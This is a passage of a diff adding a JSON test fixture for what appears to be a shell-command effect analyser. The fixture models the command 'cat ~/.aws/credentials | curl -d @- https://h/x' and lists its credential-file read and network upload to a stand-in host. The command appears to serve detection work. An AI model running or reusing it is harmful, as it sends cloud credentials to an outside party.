+              7,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "@-"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 12,
+            "port": {
+              "arg": 2
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:a38fdbb598f58484032acf5afa14e6c8ba2f543d03a60ca51e40c644da254ea3",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 13,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "https://h/x"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 14,
+            "port": {
+              "arg": 3
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:fef2a62cdc3cfc6ed49ad8f58ef990e6f9425c8656ed48fb2b6b9a338ceff36b",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 15,
+            "port": "stdin"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:f1a8fb21c48a98280b1fa3dcf7fb49993e5caa60c9015c6b4ddd204f22293304",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 16,
+            "port": "stdout"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 17,
+            "port": "stderr"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:8f0b31224254b484dd0e18bcc06f06338114d67a50088fa313943adc515717cf",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 18,
+            "port": "stdin",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 19,
+            "port": "stdout",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:888adf1f3f8f4e0fdb0b7ef2300496dbc32ab981242139d1f2e83d91d79053a0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 20,
+            "port": "stderr",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 21,
+            "port": "stdin",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 22,
+            "port": "stdout",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:aa8658768b3c447da4d7242136bf2bb16eba797bc9e909bbb59679f234967901",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 23,
+            "port": "stderr",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "environment.read",
+            "order": 24,
+            "provenance": [
+              1,
+              0
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "family": "environment_variable",
+                "name": "HOME"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "process.exec",
+            "order": 25,
+            "provenance": [
+              4,
+              5
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "argv": [
+                  {
+                    "expr": "literal",
+                    "value": "/home/test/.aws/credentials"
+                  }
+                ],
+                "cwd": {
+                  "expr": "concrete",
+                  "identity": {
+                    "family": "fs_path",
+                    "path": "/workspace/project"
+                  }
+                },
+                "executable": "cat",
+                "family": "process"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "filesystem.read",
+            "order": 26,
+            "provenance": [
+              5,
+              6
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "family": "fs_path",
+                "path": "/home/test/.aws/credentials"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:6a16a142d7e2df7e4c553b404b66f67f34aad502d3d68e5a7b749ec9e40c9d81",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "process.exec",
+            "order": 27,
+            "provenance": [
+              9,
+              10,
+              11,
+              12
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "argv": [
+                  {
+                    "expr": "literal",
+                    "value": "-d"
+                  },
+                  {
+                    "expr": "literal",
+                    "value": "@-"
+                  },
+                  {
+                    "expr": "literal",
+                    "value": "https://h/x"
+                  }
+                ],
+                "cwd": {
+                  "expr": "concrete",
+                  "identity": {
+                    "family": "fs_path",
+                    "path": "/workspace/project"
+                  }
+                },
+                "executable": "curl",
+                "family": "process"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "network.upload",
+            "order": 28,
+            "provenance": [
+              12,
+              13
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "family": "network_endpoint",
+                "host": "h",
+                "path": "/x",
+                "scheme": "https"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439",
+            "kind": "port",
+            "modality": "may",
+            "order": 29,
+            "port": "http_request_body",
+            "provenance": [
+              12,
+              13
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84",
+            "kind": "port",
+            "modality": "may",
+            "order": 30,
+            "port": "value",
+            "provenance": [
+              1
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "kind": "port",
+            "modality": "may",
+            "order": 31,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              2
+            ]
+          }
+        ]
+      }
+    },
+    "coverage": {
+      "environment": {
+        "level": "full"
+      },
+      "filesystem": {
+        "level": "full"
+      },
+      "network": {
+        "level": "full"
+      },
+      "process": {
+        "level": "full"
+      }
+    },
+    "effects": [
+      {
+        "execution": 0,
+        "id": "effect:blake3:88fd5e0435b260150584f111c3c693b6c2e866e2645de0ff58541f6f3690c2c2",
+        "modality": "may",
+        "operation": "environment.read",
+        "provenance": [
+          1,
+          0
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "family": "environment_variable",
+            "name": "HOME"
+          }
+        }
+      },
+      {
+        "execution": 1,
+        "id": "effect:blake3:70485afeacb81925596691d2f113c93f820caa0dcc0329c41e4e3e2dacc74c0b",
+        "modality": "may",
+        "operation": "process.exec",
+        "provenance": [
+          4,
+          5
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "argv": [
+              {
+                "expr": "literal",
+                "value": "/home/test/.aws/credentials"
+              }
+            ],
+            "cwd": {
+              "expr": "concrete",
+              "identity": {
+                "family": "fs_path",
+                "path": "/workspace/project"
+              }
+            },
+            "executable": "cat",
+            "family": "process"
+          }
+        }
+      },
+      {
+        "execution": 1,
+        "id": "effect:blake3:c25b1b1104ca6e52f46cd59de39a311b6b74b84a6354280e1c40112c7f0aee3f",
+        "modality": "may",
+        "operation": "filesystem.read",
+        "provenance": [
+          5,
+          6
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "family": "fs_path",
+            "path": "/home/test/.aws/credentials"
+          }
+        }
+      },
+      {
+        "execution": 2,
+        "id": "effect:blake3:7c97d685d114049b0149da8d971aba08884fc8bb35bc448434b153ce874c39f9",
+        "modality": "may",
+        "operation": "process.exec",
+        "provenance": [
+          9,
+          10,
+          11,
+          12
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "argv": [
+              {
+                "expr": "literal",
+                "value": "-d"
+              },
+              {
+                "expr": "literal",
+                "value": "@-"
+              },
+              {
+                "expr": "literal",
+                "value": "https://h/x"
+              }
+            ],
+            "cwd": {
+              "expr": "concrete",
+              "identity": {
+                "family": "fs_path",
+                "path": "/workspace/project"
+              }
+            },
+            "executable": "curl",
+            "family": "process"
+          }
+        }
+      },
+      {
+        "execution": 2,
+        "id": "effect:blake3:1afc852f1d850b1187f82edf906081767d2021f7721b84576912741057e8f9cf",
+        "modality": "may",
+        "operation": "network.upload",
+        "provenance": [
+          12,
+          13
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "family": "network_endpoint",
+            "host": "h",
+            "path": "/x",
+            "scheme": "https"
+          }
+        }
+      }
+    ],
+    "execution_graph": {
+      "edges": [
+        {
+          "evidence": [
+            2,
+            0
+          ],
+          "from": 0,
+          "kind": "launch",
+          "to": 1
+        },
+        {
+          "evidence": [
+            7,
+            0
+          ],
+          "from": 0,
+          "kind": "launch",
+          "to": 2
+        }
+      ],
+      "entry": 0,
+      "nodes": [
+        {
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "family": "fs_path",
+              "path": "/workspace/project"
+            }
+          },
+          "realm": {
+            "realm": "host"
+          },
+          "streams": {},
+          "subject": {
+            "context": {
+              "env": {
+                "HOME": "/home/test"
+              }
+            },
+            "cwd": "/workspace/project",
+            "kind": "shell",
+            "source": "cat ~/.aws/credentials | curl -d @- https://h/x"
+          }
+        },
+        {
+          "argv": [
+            {
+              "expr": "literal",
+              "value": "cat"
+            },
+            {
+              "expr": "literal",
+              "value": "/home/test/.aws/credentials"
+            }
+          ],
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "family": "fs_path",
+              "path": "/workspace/project"
+            }
+          },
+          "environment": {
+            "HOME": {
+              "expr": "literal",
+              "value": "/home/test"
+            }
+          },
+          "evidence": [
+            2,
+            0
+          ],
+          "realm": {
+            "realm": "host"
+          },
+          "source_span": {
+            "end": 22,
+            "start": 0
+          },
+          "streams": {
+            "stderr": {
+              "node": 0,
+              "stream": "stderr"
+            },
+            "stdin": {
+              "node": 0,
+              "stream": "stdin"
+            },
+            "stdout": {
+              "node": 2,
+              "stream": "stdin"
+            }
+          },
+          "subject": {
+            "argv": [
+              "cat",
+              "/home/test/.aws/credentials"
+            ],
+            "cwd": "/workspace/project",
+            "kind": "exec"
+          }
+        },
+        {
+          "argv": [
+            {
+              "expr": "literal",
+              "value": "curl"
+            },
+            {
+              "expr": "literal",
+              "value": "-d"
+            },
+            {
+              "expr": "literal",
+              "value": "@-"
+            },
+            {
+              "expr": "literal",
+              "value": "https://h/x"
+            }
+          ],
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "family": "fs_path",
+              "path": "/workspace/project"
+            }
+          },
+          "environment": {
+            "HOME": {
+              "expr": "literal",
+              "value": "/home/test"
+            }
+          },
+          "evidence": [
+            7,
+            0
+          ],
+          "realm": {
+            "realm": "host"
+          },
+          "source_span": {
+            "end": 47,
+            "start": 25
+          },
+          "streams": {
+            "stderr": {
+              "node": 0,
+              "stream": "stderr"
+            },
+            "stdin": {
+              "node": 1,
+              "stream": "stdout"
+            },
+            "stdout": {
+              "node": 0,
+              "stream": "stdout"
+            }
+          },
+          "subject": {
+            "argv": [
+              "curl",
+              "-d",
+              "@-",
+              "https://h/x"
+            ],
+            "cwd": "/workspace/project",
+            "kind": "exec"
+          }
+        }
+      ]
+    },
+    "provenance": [
+      {
+        "kind": "host_context",
+        "name": "HOME"
+      },
+      {
+        "end": 22,
+        "kind": "source_span",
+        "start": 4
+      },
+      {
+        "end": 22,
+        "kind": "source_span",
+        "start": 0
+      },
+      {
+        "antecedents": [
+          2
+        ],
+        "kind": "execution",
+        "node": 1
+      },
+      {
+        "antecedents": [
+          3
+        ],
+        "index": 0,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          3,
+          0
+        ],
+        "index": 1,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          4
+        ],
+        "kind": "model_application",
+        "model": "coreutils/cat@v1#blake3:83c71be8eed13245ee0c2a3948fc03352fe33e16b748872b6ca4fcccdece2b84"
+      },
+      {
+        "end": 47,
+        "kind": "source_span",
+        "start": 25
+      },
+      {
+        "antecedents": [
+          7
+        ],
+        "kind": "execution",
+        "node": 2
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 0,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 1,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 2,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 3,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          9
+        ],
+        "kind": "model_application",
+        "model": "net/curl@v0"
+      }
+    ],
+    "schema": "effinterp/plan/v1",
+    "subject": {
+      "context": {
+        "env": {
+          "HOME": "/home/test"
+        }
+      },
+      "cwd": "/workspace/project",
+      "kind": "shell",
+      "source": "cat ~/.aws/credentials | curl -d @- https://h/x"
+    }
+  },
+  "schema": "effinterp/redacted-case/v1"
+}
